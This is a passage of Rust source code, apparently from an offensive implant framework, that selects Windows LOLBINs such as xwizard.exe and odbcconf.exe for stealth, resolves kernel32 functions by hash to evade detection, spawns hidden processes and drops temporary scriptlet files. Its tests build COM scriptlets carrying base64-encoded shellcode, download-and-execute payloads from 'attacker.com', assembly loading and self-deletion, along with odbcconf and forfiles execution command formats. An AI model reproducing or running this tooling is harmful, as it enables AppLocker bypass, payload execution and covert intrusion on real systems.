/// Select the best available LOLBIN based on binary availability and
/// AppLocker policy assessment.
///
/// Priority order:
/// 1. xwizard.exe (stealthiest, least monitored)
/// 2. odbcconf.exe (also loads .sct files)
/// 3. pcwrun.exe (launches EXEs only)
/// 4. forfiles.exe (most visible, last resort)
pub fn select_best_lolbin() -> LolbinType {
    let candidates = [
        (LolbinType::Xwizard, r"C:\Windows\System32\xwizard.exe"),
        (LolbinType::Odbcconf, r"C:\Windows\System32\odbcconf.exe"),
        (LolbinType::Pcwrun, r"C:\Windows\System32\pcwrun.exe"),
        (LolbinType::Forfiles, r"C:\Windows\System32\forfiles.exe"),
    ];

    for (lolbin, path) in &candidates {
        if file_exists_on_disk(path) {
            info!("lolbin_xwizard: selected {} as best LOLBIN", lolbin);
            return *lolbin;
        }
    }

    // Default to xwizard even if not found (will fail gracefully).
    warn!("lolbin_xwizard: no LOLBIN found on disk, defaulting to xwizard.exe");
    LolbinType::Xwizard
}

/// Probe the availability and signature status of all LOLBINs.
pub fn enumerate_lolbins() -> Vec<LolbinInfo> {
    let candidates = [
        (LolbinType::Xwizard, r"C:\Windows\System32\xwizard.exe"),
        (LolbinType::Odbcconf, r"C:\Windows\System32\odbcconf.exe"),
        (LolbinType::Pcwrun, r"C:\Windows\System32\pcwrun.exe"),
        (LolbinType::Forfiles, r"C:\Windows\System32\forfiles.exe"),
    ];

    candidates
        .iter()
        .map(|(lolbin, path)| {
            let available = file_exists_on_disk(path);
            // We cannot verify digital signatures without calling WinTrust APIs,
            // which would add complexity.  Assume valid if the file exists in
            // System32 (Windows File Protection ensures authenticity).
            LolbinInfo {
                lolbin: *lolbin,
                available,
                signature_valid: available,
                path: path.to_string(),
            }
        })
        .collect()
}

// ═══════════════════════════════════════════════════════════════════════════
// Internal helpers — process spawning, file I/O, utilities
// ═══════════════════════════════════════════════════════════════════════════

/// Spawn a process with the given executable and command line.
///
/// # Safety
/// Caller must ensure the wide strings are valid and null-terminated.
///
/// # Returns
/// The PID of the spawned process.
unsafe fn spawn_process(exe_wide: &[u16], cmd_wide: &[u16], wait: bool) -> Result<u32> {
    let create_proc_w: FnCreateProcessW = unsafe { resolve_kernel32(HASH_CREATEPROCESSW)? };

    let mut startup_info: STARTUPINFOW = mem::zeroed();
    startup_info.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
    let mut proc_info: PROCESS_INFORMATION = mem::zeroed();

    // Use the command line buffer — CreateProcessW needs a mutable buffer.
    let mut cmd_buf: Vec<u16> = cmd_wide.to_vec();

    let creation_flags = CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT;

    let success = create_proc_w(
        exe_wide.as_ptr(),
        cmd_buf.as_mut_ptr(),
        ptr::null_mut(),
        ptr::null_mut(),
        0, // bInheritHandles = FALSE
        creation_flags,
        ptr::null_mut(),
        ptr::null_mut(),
        &mut startup_info as *mut _ as *mut c_void,
        &mut proc_info as *mut _ as *mut c_void,
    );

    if success == 0 {
        let get_last_error: FnGetLastError = unsafe { resolve_kernel32(HASH_GETLASTERROR)? };
        let err = unsafe { get_last_error() };
        bail!("CreateProcessW failed (error: {})", err);
    }

    let pid = proc_info.dw_process_id;

    // Close thread handle immediately — we don't need it.
    let close_handle: FnCloseHandle = unsafe { resolve_kernel32(HASH_CLOSEHANDLE)? };
    close_handle(proc_info.h_thread);

    if wait {
        let wait_fn: FnWaitForSingleObject =
            unsafe { resolve_kernel32(HASH_WAITFORSINGLEOBJECT)? };
        wait_fn(proc_info.h_process, INFINITE);
        close_handle(proc_info.h_process);
    } else {
        close_handle(proc_info.h_process);
    }

    debug!("lolbin_xwizard: spawned process pid={}", pid);
    Ok(pid)
}

/// Write content to a temp file with a random suffix.
///
/// # Returns
/// The wide (UTF-16) path to the temp file.
unsafe fn write_temp_scriptlet(content: &[u8], extension: &str) -> Result<Vec<u16>> {
    let get_temp_path: FnGetTempPathW = unsafe { resolve_kernel32(HASH_GETTEMPPATHW)? };
    let create_file: FnCreateFileW = unsafe { resolve_kernel32(HASH_CREATEFILEW)? };
    let write_file: FnWriteFile = unsafe { resolve_kernel32(HASH_WRITEFILE)? };
    let close_handle: FnCloseHandle = unsafe { resolve_kernel32(HASH_CLOSEHANDLE)? };

    // Get TEMP directory.
    let mut temp_dir = [0u16; MAX_PATH_W as usize];
    let len = get_temp_path(MAX_PATH_W, temp_dir.as_mut_ptr());
    if len == 0 {
        bail!("GetTempPathW failed");
    }

    // Generate random suffix.
    let suffix = random_hex_string(TEMP_SUFFIX_LEN);
    let file_name = format!("~xwz{}.{}", suffix, extension);
    let file_name_wide = to_wide(&file_name);

    // Build full path.
    let mut full_path = Vec::new();
    for &c in temp_dir.iter().take_while(|&&c| c != 0) {
        full_path.push(c);
    }
    for &c in file_name_wide.iter().take_while(|&&c| c != 0) {
        full_path.push(c);
    }
    full_path.push(0); // null terminate

    // Create the file.
    let handle = create_file(
        full_path.as_ptr(),
        GENERIC_WRITE,
        0,
        ptr::null_mut(),
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        ptr::null_mut(),
    );

    if handle == ptr::null_mut() as HANDLE || handle as usize == usize::MAX {
        bail!("CreateFileW failed for temp scriptlet");
    }

    // Write content.
    let mut bytes_written: DWORD = 0;
    let result = write_file(
        handle,
        content.as_ptr() as *const c_void,
        content.len() as DWORD,
        &mut bytes_written,
        ptr::null_mut(),
    );

    close_handle(handle);

    if result != TRUE || bytes_written as usize != content.len() {
        bail!(
            "WriteFile failed: wrote {} of {} bytes",
            bytes_written,
            content.len()
        );
    }

    debug!(
        "lolbin_xwizard: wrote temp scriptlet ({} bytes) to {:?}",
        content.len(),
        String::from_utf16_lossy(&full_path)
    );

    Ok(full_path)
}

/// Attempt to delete a file (best-effort, logs failure).
unsafe fn delete_file_best_effort(wide_path: &[u16]) -> bool {
    let delete_file: FnDeleteFileW = match unsafe { resolve_kernel32(HASH_DELETEFILEW) } {
        Ok(f) => f,
        Err(_) => {
            warn!("lolbin_xwizard: DeleteFileW not resolved — temp file not cleaned up");
            return false;
        }
    };

    let result = unsafe { delete_file(wide_path.as_ptr()) };
    if result != TRUE {
        debug!("lolbin_xwizard: failed to delete temp file (may still be in use)");
        false
    } else {
        debug!("lolbin_xwizard: deleted temp scriptlet file");
        true
    }
}

/// Check whether a file exists on disk by attempting to get its attributes.
fn file_exists_on_disk(path: &str) -> bool {
    unsafe {
        let get_attrs: FnGetFileAttributesW = match resolve_kernel32(HASH_GETFILEATTRIBUTESW) {
            Ok(f) => f,
            Err(_) => return false,
        };
        let wide = to_wide(path);
        let attrs = get_attrs(wide.as_ptr());
        // INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF
        attrs != 0xFFFFFFFF
    }
}

/// Generate a random hex string of the given length using a simple PRNG
/// seeded from the system tick count.
fn random_hex_string(len: usize) -> String {
    // Simple LCG PRNG seeded from a stack address (ASLR provides randomness).
    let seed_ptr = &len as *const usize;
    let mut state = unsafe { (seed_ptr as usize).wrapping_mul(1103515245).wrapping_add(12345) };

    let hex_chars = b"0123456789abcdef";
    let mut result = String::with_capacity(len);
    for _ in 0..len {
        state = state.wrapping_mul(1103515245).wrapping_add(12345);
        let idx = (state >> 16) as usize % 16;
        result.push(hex_chars[idx] as char);
    }
    result
}

/// Base64-encode a byte slice (no-padding, standard alphabet).
///
/// We implement this inline to avoid depending on the `base64` crate.
fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8; 64] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let mut result = String::with_capacity((data.len() + 2) / 3 * 4);
    let chunks = data.chunks(3);
    for chunk in chunks {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };

        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(ALPHABET[((triple >> 18) & 0x3F) as usize] as char);
        result.push(ALPHABET[((triple >> 12) & 0x3F) as usize] as char);

        if chunk.len() > 1 {
            result.push(ALPHABET[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }

        if chunk.len() > 2 {
            result.push(ALPHABET[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}

// ═══════════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── Base64 encoding tests ────────────────────────────────────────────

    #[test]
    fn test_base64_encode_empty() {
        assert_eq!(base64_encode(&[]), "");
    }

    #[test]
    fn test_base64_encode_single_byte() {
        assert_eq!(base64_encode(&[0x41]), "QQ==");
    }

    #[test]
    fn test_base64_encode_two_bytes() {
        assert_eq!(base64_encode(&[0x41, 0x42]), "QUI=");
    }

    #[test]
    fn test_base64_encode_three_bytes() {
        assert_eq!(base64_encode(&[0x41, 0x42, 0x43]), "QUJD");
    }

    #[test]
    fn test_base64_encode_hello_world() {
        assert_eq!(base64_encode(b"Hello, World!"), "SGVsbG8sIFdvcmxkIQ==");
    }

    #[test]
    fn test_base64_encode_shellcode_like() {
        // Simulated shellcode: \xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00
        let shellcode: &[u8] = &[0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00];
        assert_eq!(base64_encode(shellcode), "/EiD5PjowAAAAA==");
    }

    // ── Scriptlet generation tests ───────────────────────────────────────

    #[test]
    fn test_generate_scriptlet_sct_basic() {
        let shellcode = b"\xFC\x48\x83\xE4\xF0";
        let config = ScriptletConfig::default();
        let sct = ComScriptletGen::generate_scriptlet_sct(shellcode, &config);

        // Must be valid XML structure.
        assert!(sct.contains("<?xml version=\"1.0\"?>"));
        assert!(sct.contains("<package>"));
        assert!(sct.contains("</package>"));
        assert!(sct.contains("<component"));
        assert!(sct.contains("<scriptlet>"));
        assert!(sct.contains("</scriptlet>"));
        assert!(sct.contains("<script language=\"JScript\">"));
        assert!(sct.contains("</script>"));
        assert!(sct.contains("<![CDATA["));
        assert!(sct.contains("]]>"));
    }

    #[test]
    fn test_generate_scriptlet_sct_contains_base64() {
        let shellcode = b"\xFC\x48\x83\xE4\xF0";
        let config = ScriptletConfig::default();
        let sct = ComScriptletGen::generate_scriptlet_sct(shellcode, &config);

        // The base64-encoded shellcode must appear in the scriptlet.
        let expected_b64 = base64_encode(shellcode);
        assert!(sct.contains(&expected_b64));
    }

    #[test]
    fn test_generate_scriptlet_sct_vbscript() {
        let shellcode = b"\x90\x90\x90\x90";
        let config = ScriptletConfig {
            language: "VBScript".to_string(),
            ..Default::default()
        };
        let sct = ComScriptletGen::generate_scriptlet_sct(shellcode, &config);

        assert!(sct.contains("<script language=\"VBScript\">"));
        assert!(sct.contains("CreateObject"));
        assert!(sct.contains("RegisterSvr"));
    }

    #[test]
    fn test_generate_scriptlet_sct_custom_config() {
        let shellcode = b"\xCC";
        let config = ScriptletConfig {
            language: "JScript".to_string(),
            class_name: Some("MyClass".to_string()),
            prog_id: Some("My.ProgId.1".to_string()),
            clsid: Some("{DEADBEEF-1234-5678-ABCD-EF0123456789}".to_string()),
            auto_delete: false,
        };
        let sct = ComScriptletGen::generate_scriptlet_sct(shellcode, &config);

        assert!(sct.contains("id=\"{DEADBEEF-1234-5678-ABCD-EF0123456789}\""));
        assert!(sct.contains("progid=\"My.ProgId.1\""));
        // auto_delete=false should NOT contain self-delete code.
        assert!(!sct.contains("ScriptFullName"));
    }

    #[test]
    fn test_generate_scriptlet_sct_auto_delete() {
        let shellcode = b"\xCC";
        let config = ScriptletConfig {
            auto_delete: true,
            ..Default::default()
        };
        let sct = ComScriptletGen::generate_scriptlet_sct(shellcode, &config);

        assert!(sct.contains("ScriptFullName"));
    }

    // ── Payload type tests ───────────────────────────────────────────────

    #[test]
    fn test_payload_download_execute_jscript() {
        let payload = PayloadType::DownloadExecute {
            url: "http://example.com/payload.bin".to_string(),
            exec_as_shellcode: true,
        };
        let config = ScriptletConfig::default();
        let sct = ComScriptletGen::generate_inline_sct_payload(&payload, &config);

        assert!(sct.contains("http://example.com/payload.bin"));
        assert!(sct.contains("MSXML2.XMLHTTP"));
        assert!(sct.contains("ADODB.Stream"));
    }

    #[test]
    fn test_payload_download_execute_as_exe() {
        let payload = PayloadType::DownloadExecute {
            url: "http://example.com/app.exe".to_string(),
            exec_as_shellcode: false,
        };
        let config = ScriptletConfig::default();
        let sct = ComScriptletGen::generate_inline_sct_payload(&payload, &config);

        assert!(sct.contains("http://example.com/app.exe"));
        assert!(sct.contains(".exe"));
    }

    #[test]
    fn test_payload_assembly_load() {
        let payload = PayloadType::AssemblyLoad {
            assembly_b64: "AAAAAA==".to_string(),
            type_name: "Program".to_string(),
            method_name: "Main".to_string(),
        };
        let config = ScriptletConfig::default();
        let sct = ComScriptletGen::generate_inline_sct_payload(&payload, &config);

        assert!(sct.contains("AAAAAA=="));
        assert!(sct.contains(".dll"));
    }

    #[test]
    fn test_payload_vbscript_download_execute() {
        let payload = PayloadType::DownloadExecute {
            url: "http://attacker.com/stage2.bin".to_string(),
            exec_as_shellcode: true,
        };
        let config = ScriptletConfig {
            language: "VBScript".to_string(),
            ..Default::default()
        };
        let sct = ComScriptletGen::generate_inline_sct_payload(&payload, &config);

        assert!(sct.contains("<script language=\"VBScript\">"));
        assert!(sct.contains("http://attacker.com/stage2.bin"));
        assert!(sct.contains("CreateObject(\"MSXML2.XMLHTTP\")"));
    }

    // ── LolbinType tests ─────────────────────────────────────────────────

    #[test]
    fn test_lolbin_type_display() {
        assert_eq!(format!("{}", LolbinType::Xwizard), "xwizard.exe");
        assert_eq!(format!("{}", LolbinType::Odbcconf), "odbcconf.exe");
        assert_eq!(format!("{}", LolbinType::Pcwrun), "pcwrun.exe");
        assert_eq!(format!("{}", LolbinType::Forfiles), "forfiles.exe");
    }

    #[test]
    fn test_lolbin_type_equality() {
        assert_eq!(LolbinType::Xwizard, LolbinType::Xwizard);
        assert_ne!(LolbinType::Xwizard, LolbinType::Odbcconf);
    }

    // ── LolbinInfo serialization tests ───────────────────────────────────

    #[test]
    fn test_lolbin_info_serialization() {
        let info = LolbinInfo {
            lolbin: LolbinType::Xwizard,
            available: true,
            signature_valid: true,
            path: r"C:\Windows\System32\xwizard.exe".to_string(),
        };

        let json = serde_json::to_string(&info).unwrap();
        assert!(json.contains("Xwizard"));
        assert!(json.contains("xwizard.exe"));

        let deserialized: LolbinInfo = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.lolbin, LolbinType::Xwizard);
        assert!(deserialized.available);
    }

    // ── ExecutionResult serialization tests ──────────────────────────────

    #[test]
    fn test_execution_result_serialization() {
        let result = ExecutionResult {
            pid: 1234,
            command_line: r#"xwizard.exe /sct:C:\temp\payload.sct"#.to_string(),
            completed: true,
            exit_code: Some(0),
            cleaned_up: true,
        };

        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("1234"));
        assert!(json.contains("xwizard.exe"));

        let deserialized: ExecutionResult = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.pid, 1234);
        assert!(deserialized.cleaned_up);
    }

    // ── Helper function tests ────────────────────────────────────────────

    #[test]
    fn test_random_hex_string_length() {
        let s = random_hex_string(8);
        assert_eq!(s.len(), 8);
        assert!(s.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_random_hex_string_varying_lengths() {
        for len in [1, 4, 8, 16, 32] {
            let s = random_hex_string(len);
            assert_eq!(s.len(), len);
        }
    }

    #[test]
    fn test_to_wide_basic() {
        let wide = to_wide("test");
        assert_eq!(wide, &[b't' as u16, b'e' as u16, b's' as u16, b't' as u16, 0]);
    }

    #[test]
    fn test_to_wide_empty() {
        let wide = to_wide("");
        assert_eq!(wide, &[0u16]);
    }

    #[test]
    fn test_to_wide_with_backslash() {
        let wide = to_wide(r"C:\Windows");
        assert_eq!(wide[0], 'C' as u16);
        assert_eq!(wide[1], ':' as u16);
        assert_eq!(wide[2], '\\' as u16);
    }

    // ── XML structure validation tests ───────────────────────────────────

    #[test]
    fn test_scriptlet_xml_well_formed() {
        let shellcode = b"\x90\x90\x90";
        let config = ScriptletConfig::default();
        let sct = ComScriptletGen::generate_scriptlet_sct(shellcode, &config);

        // Check XML tags are balanced.
        let open_count = sct.matches("<package>").count();
        let close_count = sct.matches("</package>").count();
        assert_eq!(open_count, close_count);

        let open_comp = sct.matches("<component").count();
        assert!(open_comp >= 1);
        let close_comp = sct.matches("</component>").count();
        assert!(close_comp >= 1);
    }

    #[test]
    fn test_scriptlet_contains_registration() {
        let shellcode = b"\xCC";
        let config = ScriptletConfig::default();
        let sct = ComScriptletGen::generate_scriptlet_sct(shellcode, &config);

        assert!(sct.contains("<registration"));
        assert!(sct.contains("</registration>"));
        assert!(sct.contains("progid="));
        assert!(sct.contains("version="));
    }

    #[test]
    fn test_scriptlet_no_forbidden_binaries() {
        // Verify that no forbidden interpreter names appear in the generated
        // scriptlet content.
        let shellcode = b"\xCC\x90";
        let config = ScriptletConfig::default();
        let sct = ComScriptletGen::generate_scriptlet_sct(shellcode, &config);

        let lower = sct.to_lowercase();
        // These should NOT appear as command/exec references:
        assert!(!lower.contains("powershell"));
        assert!(!lower.contains("cmd.exe"));
        assert!(!lower.contains("wscript.exe"));
        assert!(!lower.contains("mshta.exe"));
    }

    // ── LolbinDispatcher command line tests ──────────────────────────────

    #[test]
    fn test_odbcconf_command_format() {
        // Verify the odbcconf command format is correct.
        // We can't actually execute it in tests, but we can verify the pattern.
        let scriptlet_path = r"C:\Temp\payload.sct";
        let expected = format!(
            r#"odbcconf.exe /A {{REGSVR "{}"}}"#,
            scriptlet_path
        );
        assert!(expected.contains("/A"));
        assert!(expected.contains("REGSVR"));
        assert!(expected.contains(scriptlet_path));
    }

    #[test]
    fn test_forfiles_command_format() {
        let command = "whoami";
        let expected = format!(
            r#"forfiles.exe /P C:\Windows /M notepad.exe /C "{}""#,
            command
        );
        assert!(expected.contains("/P C:\\Windows"));
        assert!(expected.contains("/M notepad.exe"));
        assert!(expected.contains("/C"));
    }

    #[test]
    fn test_pcwrun_command_format() {
        let target = r"C:\Temp\payload.exe";
        let expected = format!(r#"pcwrun.exe {}"#, target);
        assert!(expected.contains("pcwrun.exe"));
        assert!(expected.contains(target));
    }

    // ── enumerate_lolbins structure test ─────────────────────────────────

    #[test]
    fn test_enumerate_lolbins_returns_all() {
        // This test runs on non-Windows but the enumerate function
        // checks file existence — on Linux, none will be "available".
        // The important thing is it returns 4 entries.
        let lolbins = enumerate_lolbins();
        assert_eq!(lolbins.len(), 4);

        let types: Vec<LolbinType> = lolbins.iter().map(|i| i.lolbin).collect();
        assert!(types.contains(&LolbinType::Xwizard));
        assert!(types.contains(&LolbinType::Odbcconf));
        assert!(types.contains(&LolbinType::Pcwrun));
        assert!(types.contains(&LolbinType::Forfiles));
    }

    #[test]
    fn test_enumerate_lolbins_paths() {
        let lolbins = enumerate_lolbins();
        for info in &lolbins {
            assert!(info.path.contains("System32"));
            assert!(info.path.contains(".exe"));
        }
    }
}
